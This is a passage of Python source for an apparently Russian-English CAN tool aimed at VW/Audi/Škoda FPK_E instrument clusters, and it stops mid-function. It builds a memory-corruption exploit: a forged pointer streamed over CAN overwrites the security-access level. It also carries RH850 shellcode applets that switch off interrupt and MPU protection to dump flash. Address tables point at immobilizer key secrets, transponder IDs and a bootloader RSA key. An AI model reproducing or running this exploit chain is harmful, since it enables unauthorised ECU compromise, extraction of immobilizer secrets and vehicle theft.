"""VAG / Audi / VW / Škoda FPK_E (SW 83A, 1703, 1711) live CAN transport, level-8 access, RSCAN0 streaming & UDS 0x23 reader."""

from __future__ import annotations

import base64
from collections.abc import Iterator
import contextlib
from datetime import datetime, timezone
import hashlib
import inspect
import json
from pathlib import Path
import struct
import tempfile
import threading
import time
from typing import Any
import zlib

import can

from contitool.can.hw_applets import (
    _Rh850Builder,
    _emit_fpke_bfaselr_switch_subroutine,
    _emit_fpke_enter,
    _emit_fpke_leave,
    build_fpke_dflash_bc_applet,
    build_fpke_dflash_write_applet,
    build_fpke_swresa_reset_applet,
)
from contitool.can.transport import (
    BLOCK_SEND_TIMEOUT,
    FRAME_SEND_TIMEOUT,
    P2_STAR_WAIT,
    UdsNegativeResponse,
    UnexpectedUdsResponse,
    _acquire_win_timer,
    _checked_response,
    _release_win_timer,
    _tune_slcan_bus,
)
from contitool.core.fpke import (
    FPKE_BFLASH_ADDR,
    FPKE_BFLASH_SIZE,
    FPKE_CFLASH_ADDR,
    FPKE_CFLASH_CONTROL_PREFIX,
    FPKE_CFLASH_SIZE,
    FPKE_DFLASH_ADDR,
    FPKE_DFLASH_FBL_RSAKEY_OFFSET,
    FPKE_DFLASH_FBL_RSAKEY_SIZE,
    FPKE_DFLASH_SIZE,
    FPKE_EXTRA_ADDR,
    FPKE_EXTRA_SIZE,
    FPKE_UFLASH_ADDR,
    FPKE_UFLASH_SIZE,
    aes128_cbc_encrypt,
    analyze_fpke_dflash,
    analyze_fpke_extra_area,
    build_fd11_proof,
    eel_append_records,
    eel_faci_word_mask,
    eel_parse_pool,
    eel_read_record_any,
    extract_fpke_eel_updates,
    fpke_eel_layout,
    is_fpke_dflash,
    normalize_fpke_dflash_for_faci,
    summarize_fpke_dflash_changes,
    validate_fpke_extra_area,
)
from contitool.i18n import tr
from contitool.progress import NULL_REPORTER, OperationReporter

# ────────────────────────────── CAN Identifiers & Constants ──────────────────────────────

FPKE_UDS_TX_ID = 0x714
FPKE_UDS_RX_ID = 0x77E
FPKE_STREAM_RX_ID = 0x6F1

FPKE_ARM_ID = 0x1BFCA2EC
FPKE_BLOCK_ID = 0x1BFCA2ED
FPKE_ARM_RESPONSE_ID = 0x1BFCA2EE
FPKE_CF_CH9_ID = 0x17FA0E14

FPKE_NATIVE_INTERFACES: tuple[str, ...] = ("slcan", "gs_usb", "socketcan", "pcan", "kvaser", "vector")

# SW 83A (83A920700E, SW 6181) block-stream & CanTp channel-9 addresses
FPKE_BLOCK_BUFFER = 0xFEDE7820
FPKE_CANTP_CH9_PTR = 0xFEDE97F8
FPKE_LEVEL_ADDRESS = 0xFEDF3113
FPKE_FORGED_PTR = FPKE_LEVEL_ADDRESS - 6  # 0xFEDF310D
FPKE_POINTER_FRAME = (FPKE_CANTP_CH9_PTR - FPKE_BLOCK_BUFFER) // 8  # 1019
FPKE_REQUIRED_LEVEL = 8
FPKE_DEFAULT_FRAME_DELAY = 0.00035  # 0.35 ms per frame (1022 frames in ~0.358 s)
# ponytail: ~93 host frames per 64-B block + ~2700 fixed => 128 blocks ~ 15k frames (~1.5 min) at VAS 6154 pace, well
# under the ~41k frames after which VCIs died mid-transfer. Raise once long VCI writes are proven on the bench.
FPKE_SLOW_ADAPTER_MAX_BLOCKS = 128

# SW 83A MPU SX RAM applet & RH850 peripheral addresses
FPKE_APPLET_ENTRY = 0xFEDF1800
FPKE_SOURCE_PARAM = 0xFEDF1900
FPKE_RESULT_ADDR = 0xFEDF1A00
FPKE_RESULT_SIZE = 260
FPKE_BC_RESULT_SIZE = 268
FPKE_MARKER_ADDR = 0xFEDF1B00
FPKE_SAVED_MPUA3_ADDR = 0xFEDF1B10
FPKE_SAVED_RETURN = 0xFEDC3B78
FPKE_CALLER_RETURN = 0x0009CF0E
FPKE_CALLER_R29 = 0xFEDF31C8

# SW 1703 / SW 1711 (5E0920790A, VW / Škoda FPK_E) block-stream, CanTp ch-3 & MPU[1] SX RAM addresses
FPKE_1703_BLOCK_BUFFER = 0xFEDEBEB4
FPKE_1703_CANTP_PTR = 0xFEDEDCD4
FPKE_1703_LEVEL_ADDRESS = 0xFEDF5A1F
FPKE_1703_FORGED_PTR = FPKE_1703_LEVEL_ADDRESS - 6  # 0xFEDF5A19
FPKE_1703_POINTER_FRAME = (FPKE_1703_CANTP_PTR - FPKE_1703_BLOCK_BUFFER) // 8  # 964
FPKE_1703_APPLET_ENTRY = 0xFEDF4400
FPKE_1703_SOURCE_PARAM = 0xFEDF4500
FPKE_1703_RESULT_ADDR = 0xFEDF4600
FPKE_1703_MARKER_ADDR = 0xFEDF4700
FPKE_1703_SAVED_MPUA3_ADDR = 0xFEDF4710
FPKE_1703_SAVED_RETURN = 0xFEDC3978
FPKE_1703_CALLER_RETURN = 0x000AA714
FPKE_1711_CALLER_RETURN = 0x000AA748
FPKE_1703_CALLER_R29 = 0xFEDF5AC8

BFASELR_ADDR = 0xFFC59008
IDAUTH_ADDR = 0xFFA08000
IDST_ADDR = 0xFFA08010
RSCAN0_BASE = 0xFFD00000
WDTA1_BASE = 0xFFED1000

# Immobilizer RAM slot buffers (populated by 0x13FB1C / 0x13FCA0 when a working key is recognized)
FPKE_83A_RAM_S0_ADDR = 0xFEDF2D44          # 32 B: S0 (16 B) || S1 (16 B) on SW 83A (0x13FB1C)
FPKE_83A_RAM_SLOTS_FLAG_ADDR = 0xFEDF2D79  # 1 B: bit 0 = Slot A loaded, bit 1 = Slot B loaded (0x03 = both)
FPKE_83A_RAM_RECOG_STATE_ADDR = 0xFEDF2D2E  # 1 B: 2=reading, 3=learning, 4=recognized, 5=rejected
FPKE_83A_RAM_LAST_KEY_ID_ADDR = 0xFEDF2CB0  # 4 B: last transponder ID read by LF coil
FPKE_83A_RAM_EEL67_ADDR = 0xFEDF29E8       # 37 B: RAM mirror of EEL 0x67 (key IDs + allowed/learned) on SW 83A
FPKE_83A_RAM_EEL68_ADDR = 0xFEDF26DC       # 76 B: RAM mirror of EEL 0x68 (VIN, K_c, flags, mode) on SW 83A
FPKE_83A_RAM_EEL69_ADDR = 0xFEDF1E2C       # 32 B: RAM mirror of EEL 0x69 (S0 || S1) on SW 83A

FPKE_1703_RAM_S0_ADDR = 0xFEDF5650         # 32 B: S0 (16 B) || S1 (16 B) on SW 1703 (0x13FCA0)
FPKE_1703_RAM_SLOTS_FLAG_ADDR = 0xFEDF5685
FPKE_1703_RAM_RECOG_STATE_ADDR = 0xFEDF563A
FPKE_1703_RAM_LAST_KEY_ID_ADDR = 0xFEDF55BC
FPKE_1703_RAM_EEL67_ADDR = 0xFEDF5306      # 37 B: RAM mirror of EEL 0x67 on SW 1703
FPKE_1703_RAM_EEL68_ADDR = 0xFEDF52B8      # 76 B: RAM mirror of EEL 0x68 on SW 1703
FPKE_1703_RAM_EEL69_ADDR = 0xFEDF4A58      # 32 B: RAM mirror of EEL 0x69 (S0 || S1) on SW 1703

FPKE_STREAM_CHUNK_BYTES = 1024  # 128 x 8-byte CAN frames (~32 ms paced burst: ~26 KB/s, 3.6x watchdog margin & SLCAN-safe)

# Keepalive frames (2 ms apart, ~200 ms cycle; 0x3C0 KL_S+KL15=0x03, 0x663 group 5 master for MFL 0x5BF)
FPKE_KEEPALIVE_PATTERN: tuple[tuple[int, bytes], ...] = (
    (0x3C0, bytes.fromhex("00000300")),
    (0x663, bytes.fromhex("0000000e00000000")),
    (0x585, bytes.fromhex("0000000000")),
    (0x3BE, bytes.fromhex("0000000000000000")),
)

# CRC8H2F (polynomial 0x2F, ROM 0x1919C4) & E2E Data IDs from ac-can-matrix.md / can_drive_plan.py
_CRC8H2F: tuple[int, ...] = tuple(
    (
        lambda c: [c := (((c << 1) ^ 0x2F) & 0xFF if (c & 0x80) else ((c << 1) & 0xFF)) for _ in range(8)][-1]
    )(i)
    for i in range(256)
)

FPKE_E2E_DATA_ID: dict[int, tuple[int, ...]] = {
    0x31B: (0x67, 0x8A, 0xAE, 0x22, 0x4D, 0xD0, 0x51, 0x80, 0x5C, 0xB9, 0xCE, 0x1E, 0xDF, 0x02, 0x2D, 0xD4),
    0x040: (0x40,) * 16,
    0x0FD: (0xB4, 0xEF, 0xF8, 0x49, 0x1E, 0xE5, 0xC2, 0xC0, 0x97, 0x19, 0x3C, 0xC9, 0xF1, 0x98, 0xD6, 0x61),
    0x3BE: (0x1F, 0x28, 0xC6, 0x85, 0xE6, 0xF8, 0xB0, 0x19, 0x5B, 0x64, 0x35, 0x21, 0xE4, 0xF7, 0x9C, 0x24),
    0x3C0: (0xC3,) * 16,
    0x65D: (0xAC, 0xB3, 0xAB, 0xEB, 0x7A, 0xE1, 0x3B, 0xF7, 0x73, 0xBA, 0x7C, 0x9E, 0x06, 0x5F, 0x02, 0xD9),
}


def fpke_e2e_crc(can_id: int, data: bytes | bytearray) -> int:
    """Compute VW MQB E2E profile 2 CRC8H2F over `data[1:]` and `FPKE_E2E_DATA_ID[can_id][counter]`."""
    c = 0xFF
    for b in data[1:]:
        c = _CRC8H2F[c ^ b]
    return _CRC8H2F[c ^ FPKE_E2E_DATA_ID[can_id][data[1] & 0x0F]] ^ 0xFF


def build_fpke_drive_frame(
    can_id: int,
    counter: int,
    *,
    speed_kmh: float = 0.0,
    rpm: float = 0.0,
    temp_c: float = 90.0,
    distance_m: float = 0.0,
    kl15: bool = True,
    circ_mm: int = 2000,
    teeth: int = 43,
) -> bytes:
    """Build one verified MQB bench frame for FPK_E (`0x3C0`, `0x31B`, `0x0FD`, `0x65D`, `0x107`, `0x3BE`, `0x640`, `0x647`, `0x040`)."""
    d = bytearray(4 if can_id == 0x3C0 else 8)
    if can_id == 0x3C0:
        d[2] = 0x03 if kl15 else 0x00
    elif can_id == 0x31B:
        raw_spd = max(0, min(0x7F7F, round(speed_kmh * 128.0 * 1085.0 / circ_mm)))
        d[2] = (raw_spd & 0x7F) << 1
        d[3] = (raw_spd >> 7) & 0xFF
        pulses = int(distance_m * 1000.0 / circ_mm * teeth * 2) & 0x7FF
        d[5] = pulses & 0xFF
        d[6] = (pulses >> 8) & 0x07
    elif can_id == 0x0FD:
        raw_v = max(0, min(0xFFFF, round(speed_kmh / 0.01)))
        d[4] = raw_v & 0xFF
        d[5] = (raw_v >> 8) & 0xFF
    elif can_id == 0x65D:
        d[2] = teeth & 0xFF
    elif can_id == 0x107:
        raw_rpm = max(0, min(0x0FFF, round(rpm / 3.0)))
        d[3] = raw_rpm & 0xFF
        d[4] = (raw_rpm >> 8) & 0x0F
    elif can_id == 0x3BE:
        d[4] = 0x80 if rpm > 0 else 0x00
    elif can_id == 0x640:
        d[2] = max(0, min(0xFF, round(temp_c + 60.0)))
        d[3] = max(0, min(0xFF, round((temp_c + 48.0) / 0.75)))
    elif can_id == 0x647:
        d[0] = max(0, min(0xFF, round((temp_c + 48.0) / 0.75)))
    if can_id in FPKE_E2E_DATA_ID:
        d[1] = (d[1] & 0xF0) | (counter & 0x0F)
        d[0] = fpke_e2e_crc(can_id, d)
    return bytes(d)


# Steering-wheel MFL buttons (0x5BF MFL_Tasten_Kon_01, requires 0x663 group-5 master; ac-mfl-buttons.md)
FPKE_MFL_BUTTONS: tuple[tuple[str, int, int, str, str], ...] = (
    ("ok", 0x07, 0x01, "OK", "OK"),
    ("menu", 0x02, 0x01, "Меню", "Menu"),
    ("up", 0x06, 0x0F, "Вверх ▲", "Up ▲"),
    ("down", 0x06, 0x01, "Вниз ▼", "Down ▼"),
    ("back", 0x01, 0x01, "Назад", "Back"),
    ("assist", 0x04, 0x01, "Ассистенты", "Assistants"),
)

# Prepared CAN frames for the cluster CAN control panel
FPKE_CAN_PRESETS: tuple[tuple[str, int, bool, str, str, str], ...] = (
    ("kl15_on", 0x3C0, False, "00 00 03 00", "Зажигание — включить (0x3C0)", "Ignition — ON (0x3C0)"),
    ("kl15_off", 0x3C0, False, "00 00 00 00", "Зажигание — выключить (0x3C0)", "Ignition — OFF (0x3C0)"),
    ("mfl_master", 0x663, False, "00 00 00 0E 00 00 00 00", "Разрешение кнопок руля (0x663)", "Enable steering buttons (0x663)"),
    ("mfl_ok", 0x5BF, False, "07 00 01 00", "Руль — кнопка OK (0x5BF)", "Steering — OK press (0x5BF)"),
    ("mfl_menu", 0x5BF, False, "02 00 01 00", "Руль — кнопка Меню (0x5BF)", "Steering — Menu press (0x5BF)"),
    ("mfl_release", 0x5BF, False, "00 00 00 00", "Руль — отпускание кнопки (0x5BF)", "Steering — button release (0x5BF)"),
    ("rpm_idle", 0x107, False, "00 00 00 0B 01 00 00 00", "Тахометр — 800 об/мин (0x107)", "Tachometer — 800 RPM (0x107)"),
    ("rpm_3000", 0x107, False, "00 00 00 E8 03 00 00 00", "Тахометр — 3000 об/мин (0x107)", "Tachometer — 3000 RPM (0x107)"),
    ("temp_90", 0x640, False, "00 00 96 B8 00 00 00 00", "Температура ОЖ — 90 °C (0x640)", "Coolant temp — 90 °C (0x640)"),
    ("ec_reset", 0x1BFCA2EC, True, "06 00 00 00 00 00 00 00", "Сброс графического канала (0x1BFCA2EC)", "Reset display channel (0x1BFCA2EC)"),
)

FPKE_ARM_FRAMES: tuple[bytes, ...] = (
    bytes.fromhex("011104000000ffff"),
    bytes.fromhex("020000000000ffff"),
    bytes.fromhex("0301000100ffffff"),
)

# 8192-byte (1024 x 8B) CAN-descriptor-preserving block-stream template for SW 83A
FPKE_TEMPLATE_SHA256 = "c07cd47319d590880654b43f0bc82596225c4086fbfdb1474206a09f4ce2efd6"
FPKE_TEMPLATE_B85 = (
    "c-rllOKclO9L8tkXVVZnBBbGwCJi+XA<#g>yU^kmC{T(62^44`K!5-NLMad+b_@-\n"
    "Wq8<<+R3s!g^iUxV91!AwL=KhcfkT8ia0oaDRDo2f5kknQ=?=3m`<u@;d8k+sWLEZmJHMU({%3b~zTFjKrL2^d^8YPWVr})YP+X~\n"
    "|@Uf6E47=7arb5=*@9yPoyKBR1ZMCs}c7@+<tgx&W;!LGh`-\n"
    "BLq^?}i!&1g%NrR#kOXRr2v!wxIv#q%ee;N31eVzE{yi$KE4R*2sN&U!{MuVGLzbtthl=(L+ttg|y}vrxk6$4-\n"
    "|urV7UkD;9t}yA+GAFXUMVc_veOo)O4pD5d984Q#?@{yeLN{vAr`{R=}MCR2JJ&VW3ptvovld9H^3<*0u_=tF&4??VW3=}han)Bx\n"
    "K-Y!&1(nAUTNLf^;JR^J_F^}QZO-\n"
    "Y1ZYRn7waHL(WJKN4F5`VV4_prd0tI~#Ndv2#FgCw4CA0b=KY&Jb$?{SmRXpuZy44EhIREud$Ktpi<?(OE0#He%<4-\n"
    "bQRa=zd}`(4)jI0DX{H9P}5&+CWbcyAbqoV(p;Auj%X}><_UH&|8RI40<=QOF)kh+W`7~Vx6ErCw3|5?}%Ln`d4BbLHl3VSr?8SV\n"
    "wZ#7MC=OCyNF#0dM~l7K)*xmYS5n%y9V@8V%LKHh1e$C*r&7W@IEDWJ?2boGw2>-TR;yJy8-\n"
    "k8VhPZPiERaagxEIFGsJELJxA;&oD;`&b~BC-\n"
    "V%tF{iQNKvh}f;5Cy3n!`Vg@lpeKpl4tko{PS81GcYv;cLuX067m0OaUc~MMJxJ^>(Bs5<(Eo__qW=-\n"
    "Q8~u;iJ?MYLcA@{hsk3`=-XnG&jsar#qyG`xjs8ch5B-nW1L%Lm9z_2m){p*2>>>2Ow{-\n"
    "R}dJM5g@O~pUfX62GDEc3<$I$<XJ&yiIY!LmA*c0e~#GXX|o6y-)=zqk9aBd^^G+t+7&!GPidlvnV*f9DZvFFhLi0wiDBlbM{-\n"
    "+rC#MgJrA0{RHC7xA7V_7cV?HiG^~>}B*nVy~e85qlN=kJu<~ysfho`X8}0`X4cg^A|CrRH^9utIy}9;=Ptu8MX{8DV!gCM4Bh%s\n"
    "c**?(>xQgS7z}!@cnbcnQ!Dm;!kRAnoad?kg?}JFZ`?(##DcD>{KLoLYgPa$DP%W*=@JXxDOC!;X2EcS!qgXhH_acv)INg6?R|=r\n"
    "@f}Ju6e$FdKVb0owolRo|E<v?;o?@NekJ_NZ3)eWrHPq#e43+`q)0bA@SktW*#bwDu%i?C7x?qzAW*)>0W29F@>3xVwslYZ=Y73{\n"
    ";1iX>h^_3GNGfQ&yC*qeN2B3ma^zHiONkzwWlLUs|YWf>nP_fiw<d4CUc{b*Zp5F-\n"
    "gnc&AaQ0M@7rMhIZyQ1y`E@jazCm}$!0TSzT1}jOYSKX9E`ukIYLHFa!Z?Al6CM^xqLY|f23h|uw<P1a6|DxN~iU6l(%owEIaTFZ\n"
    "4pKPsDxHqp!or&?IB9;XV9R;{gvv{B5o8#5sVTw0-_sQuA=B@%>P68L?z~smBm{8+OkU7oV7UhhT8U?g8cK8p!+L@g3d3$-\n"
    "C&iVs&k8u%a?d87FR|6$AYoAKNee-BP&uJi9{CpmbB)B=>>b|@kn;T`~D5}DM6<\n"
)
FPKE_TEMPLATE = zlib.decompress(base64.b85decode("".join(FPKE_TEMPLATE_B85.split())))

# 8192-byte (1024 x 8B) CAN-descriptor-preserving block-stream template for VW/Škoda SW 1703 / 1711
FPKE_1703_TEMPLATE_SHA256 = "8f567634e79fff8d60867c629bf9a81361510482c84090edfb93d43a2017a95c"
FPKE_1703_TEMPLATE_B85 = (
    "c-rlmUu+ab9LHyGx7Xg$>$TTX3aCY(6e=ou6j70u(kg0&R$E0x<xjzaRV$((V!4n$)Wio9{}iH$Xn4TH5KN5vfRSj`QUOWyf\n"
    "du6GP?ZN08e+_u!mcyBd)M!NdzFHKB=Eaz=R5n^{q64T+<fPzc@v}6jjK0wh^uimuErG^nsy>nl_Bl-OwE_vci7(N6W+R8YR\n"
    "PleIcifxRxNdWj@)wdqn%l@Ec)iSX?(4Ve4z(I5h3#AzOoD<6q_koGLK&6B&~N@onleLW=55BAEz>$vPH7wi5ZgVvYhXC&g)\n"
    "R;`EqUMmrP|?=(3$~y-dkuI?>ti(L0LmOR_fkOp@gSJ4P%d<tW|BnUJi)h>0Ru^;J3hlFwJr<$b<v)h=PDU1mt8%XSG1e^yY\n"
    "oi)z#YA>LK2R<Z(7t&dj?y-q%dDnrpu_3X`(<ySd50}-eE+<m@w$!d51WEGn+GboP<tLsIa>+O)t*s6<&(6wxNUQn?-hwW9Y\n"
    "N|*1(&_+oXfc8An<!#Rh^qW87`BdbC&i&TQ3P4XMHX8H-Vuhfah>ZaqBUS|ZJz`@)e?e><=%0y=2i;HX8qnF_dD*p~rxLpkb\n"
    "TzSJ(94KT0KJ*m^`N&An+W<-Vv|50CN>%LAH+&PXMOKwQ!odyQqYyerh;BdY#Qi|#L7UwMeGL9dx%X3eSp}FpidCH3AEAeWj\n"
    "EvdA~pl`9AdYCUQFy((CdjsLBBz4Cg_iem4ogkHVbqgvD>h+-^*s>cZ1mNcpR}iKsOM(6Lc%FIiO!Bb{FVf#O8wTB31#qmsl\n"
    "m})5PZCIMm~1RrpSb%?DjatQvF+u^P}F#O?;Ylh{3=_YqqF`WUf$K_`gahhzQ^UUonBe`2+$i9G<inb<<m?Zg&=-a)Jm^j>2\n"
    "1ppOuH5dDwXL+F18ysQDo8e)yu?!+EO|0DJY`X8~y=zqi>MgJqV1pSZLW9WaxmZJY1^s>isTqpJf_HklQqW=+FhW<xvIr<;5\n"
    "73hD&R-*qAYeN4cwhI04ke97S|0DJkjwi&Lv2BU1LH{GR7X6Rd)98Q1TG0Q9J%j#7>{;}`AHD23^gm*)ICc|z9{Vw|b?AS@U\n"
    "O@jNwjTYD*o)|Y#9l)GBenr6hrMhg`X8~E(f^2T!ZCx`E7*R-HlzO$dlmhUSR48uF$?{V*!hL73;6NqQ$HCs`)Ak%i&)q$Ol\n"
    "|13|NX??udH*vSZ}c@=jbteJWQtVS7}W7$J%lxoH%KjCx_45@4aTdd!{p~FbCV)8i-q_Wto|YxMjuhoMFerkw$h=Uh&zEX&h\n"
    "m$GOGX8dfKwP*s?9Dbp+?Gt#Fp3a)wP-*C^g}yUP1^vu29z{mzWcINx;+`A*WzD<*uFX1?dXU*2O1Gj55C6v5!`Q5PZYFYTW\n"
    "cZ;WMjclYgaerZ>nn&dsgvW7gS&@S2XQ_h7*5*1mO&3c-3);Q;s=B2rFO<c}Vk>RYf4Zd`DByiWKg!sS}4f9k_&m9x87x|KF\n"
    "Vtu8FzpWNZ3I;gAS)_`IUdu`xntZm~@eL7aV%x|bt<`<WF_o>tvvS~efVMVIJ=Y!w&9wdEjPoir`*kKu;nBzj_X&^UV=xb2!\n"
    "Bd;*IX22UG`f#;R~an1gAS#acc;D7Yx!5uCtrR8R!aK_%fC%h2keg~YnrU7RWxIm@Vi?&<af4Iy-<Z;?sLP7(?v;1NvRC^x5\n"
    "Qs6YyVeIkXz81mIhOM!@+PktPTH_`E^O$9Lc`_8bzXcRzS|l`=#os35et6{V5hmGiUc-+_p*ujqbW^t#F2l5m;vOe>Qb64@e\n"
    "!QJIUXkUHIGnnzha4iSmIj`^Ii+H1vV^_SaS%?ftN)veXc<DTbK6t5B?oY_flU4Ve@Ae4?8^$yQo4`rz`TtLE0K^5Am&M&xI\n"
    "jysV+ykCT->&e?LDEtHe<58J+({{\n"
)
FPKE_1703_TEMPLATE = zlib.decompress(base64.b85decode("".join(FPKE_1703_TEMPLATE_B85.split())))

FPKE_PROFILES: dict[str, dict[str, Any]] = {
    "83a": {
        "name": "83a",
        "target_label": "Audi FPK_E SW 83A (83A920700E)",
        "block_buffer": FPKE_BLOCK_BUFFER,
        "cantp_channel": 9,
        "cantp_ptr": FPKE_CANTP_CH9_PTR,
        "pointer_frame": FPKE_POINTER_FRAME,
        "level_address": FPKE_LEVEL_ADDRESS,
        "forged_ptr": FPKE_FORGED_PTR,
        "template": FPKE_TEMPLATE,
        "template_sha256": FPKE_TEMPLATE_SHA256,
        "applet_entry": FPKE_APPLET_ENTRY,
        "source_param": FPKE_SOURCE_PARAM,
        "result_addr": FPKE_RESULT_ADDR,
        "marker_addr": FPKE_MARKER_ADDR,
        "saved_mpua3_addr": FPKE_SAVED_MPUA3_ADDR,
        "saved_return": FPKE_SAVED_RETURN,
        "caller_return": FPKE_CALLER_RETURN,
        "caller_r29": FPKE_CALLER_R29,
    },
    "1703": {
        "name": "1703",
        "target_label": "VW/Škoda FPK_E SW 1703 (5E0920790A)",
        "block_buffer": FPKE_1703_BLOCK_BUFFER,
        "cantp_channel": 3,
        "cantp_ptr": FPKE_1703_CANTP_PTR,
        "pointer_frame": FPKE_1703_POINTER_FRAME,
        "level_address": FPKE_1703_LEVEL_ADDRESS,
        "forged_ptr": FPKE_1703_FORGED_PTR,
        "template": FPKE_1703_TEMPLATE,
        "template_sha256": FPKE_1703_TEMPLATE_SHA256,
        "applet_entry": FPKE_1703_APPLET_ENTRY,
        "source_param": FPKE_1703_SOURCE_PARAM,
        "result_addr": FPKE_1703_RESULT_ADDR,
        "marker_addr": FPKE_1703_MARKER_ADDR,
        "saved_mpua3_addr": FPKE_1703_SAVED_MPUA3_ADDR,
        "saved_return": FPKE_1703_SAVED_RETURN,
        "caller_return": FPKE_1703_CALLER_RETURN,
        "caller_r29": FPKE_1703_CALLER_R29,
    },
    "1711": {
        "name": "1711",
        "target_label": "VW/Škoda FPK_E SW 1711 (5E0920790A)",
        "block_buffer": FPKE_1703_BLOCK_BUFFER,
        "cantp_channel": 3,
        "cantp_ptr": FPKE_1703_CANTP_PTR,
        "pointer_frame": FPKE_1703_POINTER_FRAME,
        "level_address": FPKE_1703_LEVEL_ADDRESS,
        "forged_ptr": FPKE_1703_FORGED_PTR,
        "template": FPKE_1703_TEMPLATE,
        "template_sha256": FPKE_1703_TEMPLATE_SHA256,
        "applet_entry": FPKE_1703_APPLET_ENTRY,
        "source_param": FPKE_1703_SOURCE_PARAM,
        "result_addr": FPKE_1703_RESULT_ADDR,
        "marker_addr": FPKE_1703_MARKER_ADDR,
        "saved_mpua3_addr": FPKE_1703_SAVED_MPUA3_ADDR,
        "saved_return": FPKE_1703_SAVED_RETURN,
        "caller_return": FPKE_1711_CALLER_RETURN,
        "caller_r29": FPKE_1703_CALLER_R29,
    },
}


def fpke_get_profile(profile: str | None = None) -> dict[str, Any]:
    """Return the FPK_E address & applet profile dict for `'83a'`, `'1703'`, or `'1711'`."""
    key = (profile or "83a").strip().lower()
    if key not in FPKE_PROFILES:
        raise ValueError(f"Unsupported FPK_E firmware profile: {profile!r} (expected one of {tuple(FPKE_PROFILES)})")
    return FPKE_PROFILES[key]


def fpke_detect_sw_profile(
    ident: list[dict[str, str]] | None = None,
    *,
    f189: str | None = None,
    f187: str | None = None,
) -> str:
    """Detect FPK_E software profile (`'83a'`, `'1703'`, or `'1711'`) from UDS identification DIDs (`F189`, `F187`, `F191`)."""
    vals = {str(it.get("did", "")).upper(): str(it.get("value", "")).strip() for it in (ident or [])}
    sw = "".join((f189 if f189 is not None else vals.get("F189", "")).split()).upper()
    pn = "".join((f187 if f187 is not None else (vals.get("F187") or vals.get("F191") or "")).split()).upper()
    if sw.startswith("1711"):
        return "1711"
    if sw.startswith("1703") or sw.startswith("17") or sw.startswith("16"):
        return "1703"
    if pn.startswith(("5E0", "5G0", "5G1", "5NA", "3G0", "565", "5F0", "17A", "2GA", "6VA")):
        return "1703"
    return "83a"


# Hardware-verified 256-byte RAM-buffer reader applets (PSW ID|NP save/restore)
FPKE_BFLASH_BUF_PAYLOAD_SHA256 = "310e3e70aede2e2ca80368f55cb8c7087d9ac611843e205dff87b360a701b2fb"
FPKE_BFLASH_BUF_PAYLOAD = (
    bytes.fromhex(
        "f5a7400020b6a00015b1f6a72000013280ff700080ff7e0034060019dffe3447"
        "01002906001adffe20364000283f0100693f01004442444a5f329afd003280ff"
        "420080ff500027065343414e2906001bdffe693f01003d06c831dffe3f060ecf"
        "09000052f5a720007f00"
    ).ljust(0x80, b"\x00")
    + bytes.fromhex(
        "2a060890c5ff4a3700000a5700001c007f00f86740208c660001ecc72020f8674020"
        "cc6600016062bafd1c00e6674008cc66e00020762000ec71a20df86740688c660200"
        "ecc72068f8674068e50d2c060007bcff01724c0700004c7700004c0700000c770000"
        "1c007f00"
    )
)

FPKE_UFLASH_BUF_PAYLOAD_SHA256 = "fe17a12b1e50fafd8f9cf3045f926786bc2b5415643ddc4a01419f241af96338"
FPKE_UFLASH_BUF_PAYLOAD = bytes.fromhex(
    "f5a7400020b6a00015b1f6a72000e76f20302906101bdffe693f01002706ff7f"
    "0001e76f40301c001f0034060019dffe344701002906001adffe20364000283f"
    "0100693f01004442444a5f329afd2906101bdffe293f0100e76f40301c001f00"
    "27065343414e2906001bdffe693f01003d06c831dffe3f060ecf09000052f5a7"
    "20007f00"
)


def build_fpke_bflash_buf_applet(profile: str = "83a") -> bytes:
    """Return 256-byte BFlash / Extra Area RAM-buffer reader applet for `profile` (`'83a'`, `'1703'`, or `'1711'`)."""
    prof = fpke_get_profile(profile)
    if prof["name"] == "83a":
        return FPKE_BFLASH_BUF_PAYLOAD
    src_param = int(prof["source_param"])
    result_addr = int(prof["result_addr"])
    marker_addr = int(prof["marker_addr"])
    caller_r29 = int(prof["caller_r29"])
    caller_return = int(prof["caller_return"])

    b = _Rh850Builder()
    b.stsr(5, 18, 0)              # r18 = PSW
    b.ori(0x00A0, 18, 6)          # PSW.ID | PSW.NP (blocks EI and FE interrupts while BFASELR=1)
    b.ldsr(6, 5, 0)
    b.mov_imm5(1, 6)
    b.jarl("SUB_SWITCH_BFLASH")
    b.mov_imm(src_param, 14)
    b.ld_w(0, 14, 8)              # r8 = source address
    b.mov_imm(result_addr, 9)     # r9 = 256-byte destination buffer
    b.mov_u16(64, 7)              # 64 x 4 B = 256 B
    b.label("COPY_LOOP")
    b.ld_w(0, 8, 6)
    b.st_w(6, 0, 9)
    b.add_imm5(4, 8)
    b.add_imm5(4, 9)
    b.add_imm5(-1, 7)
    b.bne_short("COPY_LOOP")
    b.mov_imm5(0, 6)
    b.jarl("SUB_SWITCH_BFLASH")
    b.mov_imm(0x4E414353, 7)      # "SCAN"
    b.st_w(7, marker_addr - src_param, 14)
    b.mov_imm(caller_r29, 29)
    _emit_fpke_leave(b, caller_return=caller_return)
    _emit_fpke_bfaselr_switch_subroutine(b, "SUB_SWITCH_BFLASH")
    payload = b.build()
    if len(payload) > 0x100:
        raise RuntimeError(f"FPK_E bflash buffer applet ({prof['name']}) size {len(payload)} exceeds 256-byte slot")
    return payload


def build_fpke_uflash_buf_applet(profile: str = "83a") -> bytes:
    """Return 256-byte UFlash RAM-buffer reader applet (`MPM` SV bypass) for `profile` (`'83a'`, `'1703'`, or `'1711'`)."""
    prof = fpke_get_profile(profile)
    src_param = int(prof["source_param"])
    result_addr = int(prof["result_addr"])
    marker_addr = int(prof["marker_addr"])
    caller_r29 = int(prof["caller_r29"])
    caller_return = int(prof["caller_return"])

    b = _Rh850Builder()
    b.stsr(5, 18, 0)              # r18 = PSW
    b.ori(0x00A0, 18, 6)          # PSW.ID | PSW.NP
    b.ldsr(6, 5, 0)
    b.stsr(0, 19, 5)              # r19 = MPM (SR 0, sel 5)
    b.andi(0xFFFC, 19, 6)         # clear MPE & SVP (disable MPU checks in SV mode)
    b.ldsr(6, 0, 5)
    b.synci()
    b.syncp()
    b.mov_imm(src_param, 14)
    b.ld_w(0, 14, 8)              # r8 = source address
    b.mov_imm(result_addr, 9)     # r9 = 256-byte destination buffer
    b.mov_u16(64, 7)              # 64 x 4 B = 256 B
    b.label("COPY_LOOP")
    b.ld_w(0, 8, 6)
    b.st_w(6, 0, 9)
    b.add_imm5(4, 8)
    b.add_imm5(4, 9)
    b.add_imm5(-1, 7)
    b.bne_short("COPY_LOOP")
    b.ldsr(19, 0, 5)              # restore MPM
    b.synci()
    b.syncp()
    b.mov_imm(0x4E414353, 7)      # "SCAN"
